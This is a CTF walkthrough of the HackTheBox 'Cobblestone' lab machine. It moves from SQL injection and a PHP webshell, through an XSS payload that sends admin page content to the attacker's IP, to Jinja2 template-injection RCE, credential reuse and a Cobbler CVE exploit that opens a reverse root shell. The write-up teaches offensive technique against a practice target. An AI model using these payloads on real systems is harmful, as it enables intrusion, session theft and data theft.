# Cobblestone — HackTheBox Writeup

**Difficulty:** Insane
**OS:** Linux
**Target IP:** `10.129.xx.xx`
**Attacker (VPN) IP:** `10.10.xx.xx`

> Note on redaction: all flags, password hashes, cracked passwords, and session cookie values in this writeup have been replaced with `[REDACTED_...]` placeholders. The target IP is shown as `10.129.xx.xx` throughout (the box's IP changed once between sessions in the raw notes — both original values pointed at the same target and are normalized here). The attacker VPN IP is shown as `10.10.xx.xx`.

---

## 1. Reconnaissance

### 1.1 Nmap scan

```
nmap -sV -sC 10.129.xx.xx
```

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-22 12:35 +0545
Nmap scan report for 10.129.xx.xx
Host is up (0.96s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 [REDACTED_HOSTKEY] (ECDSA)
|_  256 [REDACTED_HOSTKEY] (ED25519)
80/tcp open  http    Apache httpd 2.4.62
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Did not follow redirect to http://cobblestone.htb/
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.34 seconds
```

Only SSH (22) and HTTP (80) are open. The HTTP service redirects to a virtual host name (`cobblestone.htb`), so the first step is to add that to `/etc/hosts`.

### 1.2 Setting up `/etc/hosts`

Initial entry, just enough to follow the redirect from the nmap scan:

```
cat /etc/hosts
10.129.xx.xx  cobblestone.htb

127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouterso
```

After browsing the main site and doing further enumeration (virtual host / subdomain discovery — e.g. via a tool like `ffuf` or `gobuster` against the `Host` header, or simply following links found on the main page), two more vhosts were identified: `vote.cobblestone.htb` and `deploy.cobblestone.htb`. The hosts file was updated accordingly:

```
cat /etc/hosts
10.129.xx.xx  cobblestone.htb vote.cobblestone.htb deploy.cobblestone.htb

127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouterso
```

These three virtual hosts (`cobblestone.htb`, `vote.cobblestone.htb`, `deploy.cobblestone.htb`) form the overall attack surface for this box.

---

## 2. Enumerating `vote.cobblestone.htb`

Browsing `vote.cobblestone.htb` revealed a "suggestion" voting application, where users can submit a suggestion (a URL) and other users vote on it. The submission endpoint is `suggest.php`, which accepts a `url` parameter.

### 2.1 Testing the `url` parameter

A simple request was sent to confirm request structure and behavior:

```
POST /suggest.php HTTP/1.1
Host: vote.cobblestone.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: http://vote.cobblestone.htb
Connection: keep-alive
Referer: http://vote.cobblestone.htb/index.php
Cookie: PHPSESSID=[REDACTED_SESSION_COOKIE]
Upgrade-Insecure-Requests: 1
Priority: u=0, i

url=http%3A%2F%2F127.0.0.1+
```

This request (saved as `1.txt`) was then used as a base request for automated SQL injection testing with `sqlmap`.

### 2.2 Confirming SQL injection with sqlmap

```
sqlmap -r 1.txt -p url --level 5 --risk 3 --batch --threads 5
```

```
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.10#stable}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[*] starting @ 12:54:00 /2026-02-22/

[12:54:00] [INFO] parsing HTTP request from '1.txt'
[12:54:01] [INFO] resuming back-end DBMS 'mysql'
[12:54:01] [INFO] testing connection to the target URL
got a 302 redirect to 'http://vote.cobblestone.htb/details.php?id=6'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: url (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: url=cobblestone.htb' AND 9695=9695 AND 'BuqS'='BuqS

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: url=cobblestone.htb' AND (SELECT 4007 FROM (SELECT(SLEEP(5)))JLJq) AND 'GwUJ'='GwUJ

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: url=-7928' UNION ALL SELECT NULL,CONCAT(0x7171767a71,0x4579526e7a75465041776b4d4454487a6f7a4f49427964594a696c4656524c4a6f6e6275476d4961,0x71706a6271),NULL,NULL,NULL-- -
---
[12:54:03] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[12:54:03] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/vote.cobblestone.htb'

[*] ending @ 12:54:03 /2026-02-22/
```

**What this shows in plain terms:** the `url` POST parameter in `suggest.php` is injectable in three different ways:
- **Boolean-based blind** — the query result changes (true/false) depending on whether the injected condition is true, letting you infer data one bit at a time.
- **Time-based blind** — using `SLEEP()`, the response is deliberately delayed when the injected condition is true, which also lets you infer data even with no visible output difference.
- **UNION-based** — the query result set has exactly 5 columns, and one of them is reflected back into the page, so arbitrary data can be pulled straight into the HTML response using `UNION SELECT`.

The database is confirmed to be **MySQL / MariaDB** running on **Linux Debian**.

---

## 3. Getting a Webshell via SQLi File Write

Since it's MySQL/MariaDB with UNION-based injection confirmed, and (implicitly, from sqlmap's ability to write files) the web root is writable and `secure_file_priv` is not restrictive, sqlmap's `--file-write` / `--file-dest` feature was used to drop a simple PHP webshell onto the server.

### 3.1 The webshell

```php
cat shell.php

<?php echo shell_exec($_GET['cmd']); ?>
```

A minimal one-liner shell that runs any command passed in the `cmd` GET parameter and prints the output.

### 3.2 Writing the file via sqlmap

```
sqlmap -r 1.txt -p url --batch --file-write=/home/kali/shell.php --file-dest="/var/www/html/skins/test.php"
```

```
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.10#stable}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[*] starting @ 06:10:16 /2026-03-04/

[06:10:16] [INFO] parsing HTTP request from '1.txt'
[06:10:16] [INFO] resuming back-end DBMS 'mysql'
[06:10:16] [INFO] testing connection to the target URL
got a 302 redirect to 'http://vote.cobblestone.htb/details.php?id=4'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: url (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: url=cobblestone.htb' AND 9695=9695 AND 'BuqS'='BuqS

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: url=cobblestone.htb' AND (SELECT 4007 FROM (SELECT(SLEEP(5)))JLJq) AND 'GwUJ'='GwUJ

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: url=-7928' UNION ALL SELECT NULL,CONCAT(0x7171767a71,0x4579526e7a75465041776b4d4454487a6f7a4f49427964594a696c4656524c4a6f6e6275476d4961,0x71706a6271),NULL,NULL,NULL-- -
---
[06:10:17] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL 5 (MariaDB fork)
[06:10:17] [INFO] fingerprinting the back-end DBMS operating system
[06:10:17] [INFO] the back-end DBMS operating system is Linux
[06:10:20] [WARNING] expect junk characters inside the file as a leftover from UNION query
do you want confirmation that the local file '/home/kali/shell.php' has been successfully written on the back-end DBMS file system ('/var/www/html/skins/test.php')? [Y/n] Y
[06:10:21] [WARNING] reflective value(s) found and filtering out
[06:10:21] [INFO] the remote file '/var/www/html/skins/test.php' is larger (45 B) than the local file '/home/kali/shell.php' (41B)
[06:10:21] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/vote.cobblestone.htb'

[*] ending @ 06:10:21 /2026-03-04/
```

This confirms the file was written to `/var/www/html/skins/test.php`, giving basic command execution (RCE) through `http://vote.cobblestone.htb/skins/test.php?cmd=...`.

<img width="1289" height="940" alt="Screenshot 2026-03-04 120245" src="https://github.com/user-attachments/assets/950e921b-6ef1-4ebc-b5dd-8f8d21e87252" />

> **Complexity note:** RCE was achieved here, but a full interactive reverse shell could **not** be obtained through this webshell (likely due to outbound connection restrictions, a locked-down `shell_exec` environment, or missing shell utilities). Because of that limitation, the RCE was used only for read-only reconnaissance (like confirming command execution and reading files) while the rest of the attack path was pursued through the SQL injection and other vulnerabilities directly, rather than trying to force a shell from this specific foothold.

---

## 4. Extracting Credentials via SQL Injection

### 4.1 Manual UNION-based extraction of the `users` table

Rather than relying solely on sqlmap's automation, a manual UNION-based payload was crafted to pull `username` and `password` straight out of the `users` table, using the same 5-column structure sqlmap had already fingerprinted:

```
curl -i -X POST -d "url=' UNION SELECT 1,2,3,group_concat(username,0x3a,password),5 FROM users -- -" -b "PHPSESSID=[REDACTED_SESSION_COOKIE]" http://vote.cobblestone.htb/suggest.php
```

```
HTTP/1.1 302 Found
Date: Wed, 04 Mar 2026 10:38:10 GMT
Server: Apache/2.4.62 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: details.php?id=298
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

The application stores the injected/submitted "suggestion" as a new row and redirects to `details.php?id=298` to view it — a classic side effect of UNION-based injection into an INSERT-then-SELECT style workflow. Fetching that page reveals the extracted data:

```
curl -b "PHPSESSID=[REDACTED_SESSION_COOKIE]" http://vote.cobblestone.htb/details.php?id=298
```

```html
<!-- Proudly coded by Billy (https://bybilly.uk) -->
<!-- Version: 1.9.2 -->

<!DOCTYPE html>
<html>
<head>
        <title>Cobblestone - Server Details</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta charset="utf-8">
    <link rel="stylesheet" href="css/bootstrap.min.css">
        <link rel="stylesheet" href="css/all.min.css">
        <link rel="stylesheet" href="css/stylesheet.css">
</head>
<body>
        <div class="container-fluid">
                <div class="mt-4">
                    <div class="card mt-4">
                      <div class="card-header">
                        Suggestion #1 - admin:[REDACTED_HASH],hello:[REDACTED_HASH]
                      </div>
                      <div class="card-body">
                      <h6 class="card-subtitle mb-2 text-body-secondary">Approved: false</h6>
                      <p class="card-text">Owner-ID: 2 - Votes: 5</p>
                      </div>
                    </div>
                </div>
                        <a class="btn btn-light mt-4" href="index.php">back</a>
        </div>
    <script src="js/bootstrap.bundle.min.js" type="text/javascript"></script>
        <script src="js/jquery.min.js" type="text/javascript"></script>
        <script src="js/firefly.js" type="text/javascript"></script>
        <script src="js/main.js" type="text/javascript"></script>
</body>
</html>
```

Two bcrypt hashes (`$2y$10$...` format) were recovered this way, for users `admin` and `hello`. An attempt was made to crack these bcrypt hashes offline, but **this attempt failed** — bcrypt is intentionally slow/expensive to brute-force, so a rockyou-style wordlist attack against it did not succeed in reasonable time.

### 4.2 Reading source files via SQLi — finding DB credentials

sqlmap's file-read capability (part of the same injection/DBMS-level file access used earlier for the file write) was used to pull PHP source files from the server, including the database connection file:

```
cat /home/kali/.local/share/sqlmap/output/vote.cobblestone.htb/files/_var_www_html_db_connection.php
```

```php
<?php

$dbserver = "localhost";
$username = "dbuser";
$password = "[REDACTED_PASSWORD]";
$dbname = "cobblestone";

$conn = new mysqli($dbserver, $username, $password, $dbname);

// Check connection
if ($conn->connect_errno > 0) {
    die("Connection failed: " . $conn->connect_error);
}
?>
```

This gives direct MySQL credentials (`dbuser` / a plaintext password) for the `cobblestone` database. This credential turns out to be reusable later on (see Section 6) to dump the database directly through a completely different vulnerability (SSTI), which is a good proof that the credential is valid and not a one-off.

---

## 5. Stealing the Admin Session via XSS (bypassing HttpOnly)

Moving to the main site, `http://cobblestone.htb/skins.php` lets a user "suggest a skin" via URL input. Testing this input revealed it was vulnerable to stored/reflected XSS.

**The problem:** the session cookie (`PHPSESSID`) is marked `HttpOnly`, meaning JavaScript running in the browser (via `document.cookie`) **cannot** read it directly. This rules out the classic "steal `document.cookie` and send it to my server" XSS payload.

**The workaround:** instead of trying to read the cookie directly, the XSS payload was used to make the **victim's authenticated browser** fetch a page on the site (which the browser automatically attaches the session cookie to, since it's a same-origin request) and then exfiltrate the **HTML content of that page** to an attacker-controlled server. The cookie itself never needs to be read by JavaScript — the browser sends it on the `fetch()` request as normal, and the *response body* (not the cookie) is what gets leaked out.

### 5.1 First payload — dump `skins.php` as seen by the admin

```html
"><img src=x onerror="fetch('/skins.php').then(r=>r.text()).then(t=>fetch('http://10.10.xx.xx/',{method:'POST',body:t}))">
```

Catching the exfiltrated data with a listener:

```
nc -nlvp 80
listening on [any] 80 ...
connect to [10.10.xx.xx] from (UNKNOWN) [10.129.xx.xx] 60870
POST / HTTP/1.1
Host: 10.10.xx.xx
Connection: keep-alive
Content-Length: 12396
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Referer: http://cobblestone.htb/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

<!-- Proudly coded by Billy (https://bybilly.uk) -->
<!-- Version: 1.9.2 -->

<!DOCTYPE html>
<html>
<head>
        <title>Cobblestone - Skins</title>
.
.
.
  <div class="container">
    <div class="row">
      <div class="col-md-12 mb-3">
        <p><a class="text-bold text-light" href="skins_app_admin_server_info.php" target="_blank">Admin server info</a></p>
      </div>
    </div>
  </div>
.
.
.
```

This confirms the payload fired inside the admin's authenticated browser session and revealed a page only visible to admins: `skins_app_admin_server_info.php`.

### 5.2 Second payload — dump the admin server info page

```html
"><img src=x onerror="fetch('/skins_app_admin_server_info.php').then(r=>r.text()).then(t=>fetch('http://10.10.xx.xx/',{method:'POST',body:t}))">
```

```
nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.xx.xx] from (UNKNOWN) [10.129.xx.xx] 57772
POST / HTTP/1.1
Host: 10.10.xx.xx
Connection: keep-alive
Content-Length: 89369
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Referer: http://cobblestone.htb/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

USERNAME: admin<br>
FIRST NAME: admin<br>
LAST NAME: admin<br>
ROLE: admin<br>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
.
.
.
<tr><td class="e">HTTP_ACCEPT </td><td class="v">*/* </td></tr>
<tr><td class="e">HTTP_REFERER </td><td class="v">http://cobblestone.htb/skins.php </td></tr>
<tr><td class="e">HTTP_ACCEPT_ENCODING </td><td class="v">gzip, deflate </td></tr>
<tr><td class="e">HTTP_ACCEPT_LANGUAGE </td><td class="v">en-US,en;q=0.9 </td></tr>
<tr><td class="e">HTTP_COOKIE </td><td class="v">PHPSESSID=[REDACTED_SESSION_COOKIE] </td></tr>
.
.
.
```

**This is the key trick:** the "admin server info" page turned out to be a `phpinfo()`-style debug page, which dumps *all* incoming HTTP request headers — including the raw `Cookie` header. Since `HttpOnly` only stops **JavaScript** from reading the cookie, it does nothing to stop the **server itself** from echoing that same cookie back in its own response. By using XSS to make the admin's browser visit this info-disclosure page and exfiltrating the resulting HTML, the admin's `PHPSESSID` value was recovered indirectly — without ever needing `document.cookie`.

With this session ID, the attacker can now impersonate the admin user directly by setting the cookie:

```
Cookie: PHPSESSID=[REDACTED_SESSION_COOKIE]
```

---

## 6. Server-Side Template Injection (SSTI) in `preview_banner.php`

Earlier source-code enumeration via sqlmap's file-read had surfaced `/preview_banner.php` as a file of interest. As the admin, this endpoint was tested for SSTI.

### 6.1 Confirming SSTI

```
curl -s -X POST http://cobblestone.htb/preview_banner.php \
     -b "PHPSESSID=[REDACTED_SESSION_COOKIE]" \
     -d "first={{7*7}}"
```

```html
<h1 class="text-light display-3">Welcome 49</h1>
```

`{{7*7}}` evaluating to `49` (not `7*7` literally) confirms server-side template rendering (Jinja2-style syntax), meaning this specific endpoint is likely handled by an embedded Python/Flask/Jinja2 component rather than plain PHP string interpolation — an unusual but not uncommon pattern where a PHP app shells out to, or embeds, a small Python-based templating service for banner previews.

### 6.2 Achieving RCE through SSTI

Using a standard Jinja2 SSTI-to-RCE gadget chain (`|map('system')`):

```
curl -s -X POST http://cobblestone.htb/preview_banner.php \
     -b "PHPSESSID=[REDACTED_SESSION_COOKIE]" \
     -d "first={{['id']|map('system')|join}}"
```

```html
<h1 class="text-light display-3">Welcome uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data)</h1>
```

Command execution confirmed as `www-data`.

> **Complexity note:** as with the earlier SQLi-based webshell, an attempt to spawn a full interactive reverse shell through this SSTI RCE also **failed**. Rather than fighting the shell restrictions further, the RCE was instead used directly to run useful one-off commands (see below) — proving that a "failed reverse shell" doesn't mean the RCE is useless; it can still be leveraged for direct command execution.

### 6.3 Using the RCE to dump the database directly (proving password reuse)

Instead of relying purely on blind/UNION SQLi to extract data, the `dbuser` credentials recovered earlier from `db_connection.php` (Section 4.2) were used directly with `mysqldump`, run through the SSTI RCE:

```
curl -s -X POST http://cobblestone.htb/preview_banner.php \
     -b "PHPSESSID=[REDACTED_SESSION_COOKIE]" \
     --data-urlencode "first={{['mysqldump -u dbuser -p\"[REDACTED_PASSWORD]\" cobblestone users']|map('system')|join}}"
```

```html
<h1 class="text-light display-3">Welcome /*M!999999\- enable the sandbox mode */
-- MariaDB dump 10.19-12.0.2-MariaDB, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: cobblestone
-- ------------------------------------------------------
-- Server version       12.0.2-MariaDB-deb12-log
.
.
.
(1,'admin','admin','admin','admin@cobblestone.htb','admin','[REDACTED_HASH]','*'),
(2,'cobble','cobble','stone','cobble@cobblestone.htb','admin','[REDACTED_HASH]','*'),
(3,'hello','hello','hello','hello@cobble.htb','user','[REDACTED_HASH]','10.10.xx.xx');
.
.
.
```

**This proves the `dbuser` credential from `db_connection.php` is valid and reusable** — it successfully authenticated a direct `mysqldump` connection to the database, confirming it wasn't a stale or decoy credential.

This dump reveals a **third user row: `cobble`**, with a different (SHA-256 style) password hash format than the bcrypt hashes seen earlier via the blind SQLi. This is the credential that matters for the next stage.

### 6.4 Cracking the `cobble` hash — the real password reuse

```
john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

```
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 SSE2 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED_PASSWORD]     (?)
1g 0:00:00:00 DONE (2026-03-06 04:34) 1.562g/s 11571Kp/s 11571Kc/s 11571KC/s iluvdonya1..ilovejepay
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed.
```

Unlike the bcrypt hashes, this hash used plain **Raw-SHA256**, which is far weaker (no salt, no work factor), so it cracked instantly against `rockyou.txt`.

**Why this matters / the password reuse:** the cracked password belongs to the web application's `cobble` account. As shown in the next section, this exact password also works for the **`cobble` OS-level SSH account** on the box — i.e. the same human reused their web app password as their real system password. This is the classic "password reuse" pitfall this box is testing, and the proof is simply that the SSH login below succeeds using the cracked value.

### 6.5 Further RCE recon — reading `/etc/passwd`

```
curl -s -X POST http://cobblestone.htb/preview_banner.php \
     -b "PHPSESSID=[REDACTED_SESSION_COOKIE]" \
     -d "first={{['cat /etc/passwd']|map('system')|join}}"
```

```html
<h1 class="text-light display-3">Welcome root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:101:109:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
cobble:x:1000:1000:cobble,,,:/home/cobble:/bin/rbash
mysql:x:103:112:MySQL Server,,,:/nonexistent:/bin/false
tftp:x:104:113:tftp daemon,,,:/srv/tftp:/usr/sbin/nologin
_laurel:x:999:996::/var/log/laurel:/bin/false
john:x:1001:1001:,,,:/home/john:/bin/bash
john:x:1001:1001:,,,:/home/john:/bin/bash</h1>
```

This confirms the OS-level `cobble` user exists, with `/bin/rbash` (restricted bash) as its shell — a hint that once SSH access is obtained, the shell will be locked down.

---

## 7. SSH Access as `cobble`

Using the password cracked in Section 6.4:

```
ssh cobble@10.129.xx.xx
```

```
The authenticity of host '10.129.xx.xx (10.129.xx.xx)' can't be established.
ED25519 key fingerprint is: SHA256:[REDACTED_FINGERPRINT]
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:203: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.xx.xx' (ED25519) to the list of known hosts.
cobble@10.129.xx.xx's password:
Linux cobblestone 6.1.0-37-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.140-1 (2025-05-22) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
cobble@cobblestone:~$
```

Login succeeds — **this is the concrete proof of the password reuse**: the SHA-256 hash cracked from the web app's database decrypted to the exact same password protecting the real `cobble` OS account over SSH.

As expected from `/etc/passwd`, this drops into a **restricted shell (`rbash`)**:

```
we have rbash which is restricted shell.
```

Various attempts were made to break out of the `rbash` restriction (e.g. abusing allowed binaries, `PATH` manipulation, etc.), but **these attempts failed** — the restricted shell held up. Rather than continuing to fight it, the flag was grabbed and enumeration moved to what could be done *within* the restrictions.

```
cobble@cobblestone:~$ cat user.txt
[REDACTED_FLAG]
```

---

## 8. Finding an Internal-Only Service

Even inside `rbash`, some basic commands were still permitted, including checking listening ports:

```
cobble@cobblestone:~$ ss -tulnp
```

```
Netid          State           Recv-Q          Send-Q                    Local Address:Port                      Peer Address:Port          Process
udp            UNCONN          0               0                               0.0.0.0:68                             0.0.0.0:*
udp            UNCONN          0               0                               0.0.0.0:69                             0.0.0.0:*
udp            UNCONN          0               0                                  [::]:69                                [::]:*
tcp            LISTEN          0               5                             127.0.0.1:25151                          0.0.0.0:*
tcp            LISTEN          0               128                             0.0.0.0:22                             0.0.0.0:*
tcp            LISTEN          0               511                             0.0.0.0:80                             0.0.0.0:*
tcp            LISTEN          0               80                            127.0.0.1:3306                           0.0.0.0:*
tcp            LISTEN          0               128                                [::]:22                                [::]:*
```

Port `3306` is MySQL (already known/used). Port **`25151`**, bound only to `127.0.0.1`, is unfamiliar and only reachable from inside the box — a strong candidate for privilege escalation, since it's clearly an internal management service not meant to be reached from the outside.

### 8.1 Tunneling the internal port with SSH local port forwarding

To reach `127.0.0.1:25151` from the attacker's machine, an SSH local port forward was set up, mapping local port `8888` to the remote (target-side) `127.0.0.1:25151`:

```
ssh -L 8888:127.0.0.1:25151 cobble@10.129.xx.xx
```

```
cobble@10.129.xx.xx's password:
Linux cobblestone 6.1.0-37-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.140-1 (2025-05-22) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
cobble@cobblestone:~$
```

**In plain terms:** any connection made to `127.0.0.1:8888` on the *attacker's own machine* now gets silently forwarded, through the encrypted SSH tunnel, to `127.0.0.1:25151` *on the target*. This effectively makes the internal-only service reachable locally, as if it were running on the attacker's own laptop.

Probing the service on port 25151 identified it as **Cobbler** (a Linux provisioning/installation server), reachable via its XMLRPC API.

---

## 9. Root via CVE-2024-47533 — Cobbler XMLRPC Authentication Bypass RCE

Cobbler's XMLRPC interface running on port `25151` is vulnerable to **CVE-2024-47533**, an authentication bypass that leads to remote code execution.

**Public exploit / reference:**
`https://github.com/dollarboysushil/CVE-2024-47533-Cobbler-XMLRPC-Authentication-Bypass-RCE-Exploit-POC`

### 9.1 Setting up a listener

```
nc -lvnp 4449
listening on [any] 4449 ...
```

### 9.2 Running the exploit against the tunneled port

```
python3 CVE-2024-47533-dbs.py -t http://127.0.0.1:8888 -l 10.10.xx.xx -p 4449 --payload bash
```

```
[*] Target: http://127.0.0.1:8888
[*] Listener: 10.10.xx.xx:4449
[*] Payload: bash
[*] Connecting to Cobbler...
[*] Authenticating...
[*] Executing exploit...
[+] Exploit sent! Check your listener.
```

### 9.3 Catching the root shell

```
nc -lvnp 4449
listening on [any] 4449 ...
connect to [10.10.xx.xx] from (UNKNOWN) [10.129.xx.xx] 56158
bash: cannot set terminal process group (1067): Inappropriate ioctl for device
bash: no job control in this shell
root@cobblestone:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```

Full root access confirmed. Cobbler's XMLRPC service, being an internal automation/provisioning tool, runs with root privileges by design (it needs to manage system-level installs), which is exactly why bypassing its authentication is so impactful.

### 9.4 Root flag

```
root@cobblestone:/root# cat root.txt
cat root.txt
[REDACTED_FLAG]
```

---

## 10. Step-by-Step Summary

1. **Nmap scan** → only SSH (22) and HTTP (80) open; HTTP redirects to `cobblestone.htb`.
2. **Set up `/etc/hosts`** for `cobblestone.htb`, then discovered and added `vote.cobblestone.htb` and `deploy.cobblestone.htb`.
3. **Found `suggest.php`** on `vote.cobblestone.htb`, taking a `url` POST parameter.
4. **Confirmed SQL injection** on the `url` parameter using `sqlmap` (boolean-blind, time-blind, and 5-column UNION-based).
5. **Wrote a PHP webshell** to `/var/www/html/skins/test.php` via `sqlmap --file-write` / `--file-dest`, gaining RCE as `www-data` (reverse shell attempts from here failed; used for read-only recon only).
6. **Manually extracted `users` table hashes** (bcrypt, for `admin`/`hello`) via a UNION-based `group_concat` payload; bcrypt cracking attempt **failed**.
7. **Read `db_connection.php` via SQLi file-read**, recovering plaintext `dbuser` MySQL credentials.
8. **Found and exploited stored XSS** on `skins.php`; since the session cookie is `HttpOnly` (blocking direct `document.cookie` theft), used XSS to make the **admin's browser** fetch and exfiltrate page content instead of the cookie itself.
9. **First exfiltrated page** (`skins.php`) revealed a hidden admin-only link: `skins_app_admin_server_info.php`.
10. **Second exfiltrated page** was a `phpinfo()`-style debug page that echoed the raw `Cookie` request header — indirectly leaking the admin's `PHPSESSID`, since HttpOnly only blocks JS, not the server itself from displaying it.
11. **Impersonated admin** using the stolen session cookie.
12. **Found and confirmed SSTI** in `/preview_banner.php` (`{{7*7}}` → `49`), consistent with Jinja2/Python template rendering.
13. **Achieved RCE via SSTI** using `{{['id']|map('system')|join}}` → confirmed command execution as `www-data` (reverse shell attempts again **failed**; used RCE directly for one-off commands instead).
14. **Ran `mysqldump`** through the SSTI RCE using the `dbuser` credential recovered earlier, proving that credential was valid and dumping the full `users` table — revealing a third account, `cobble`, with a weaker Raw-SHA256 password hash.
15. **Cracked the `cobble` hash** instantly with `john` + `rockyou.txt` (Raw-SHA256 is unsalted/fast, unlike the earlier bcrypt hashes).
16. **Read `/etc/passwd` via SSTI RCE**, confirming a real OS-level `cobble` user with `/bin/rbash` as shell.
17. **SSH'd in as `cobble`** using the cracked password — **this is the proof of password reuse**: the same password protects both the web app account and the real Linux user account. Landed in a restricted shell (`rbash`); breakout attempts **failed**, so it was accepted as-is.
18. **Captured `user.txt`**.
19. **Enumerated internal listening ports** with `ss -tulnp` (allowed even in `rbash`), found `127.0.0.1:25151` — an internal-only service not reachable from outside.
20. **Set up an SSH local port forward** (`ssh -L 8888:127.0.0.1:25151 ...`) to expose that internal port locally on the attacker machine.
21. **Identified the service as Cobbler**, vulnerable to **CVE-2024-47533** (XMLRPC authentication bypass RCE).
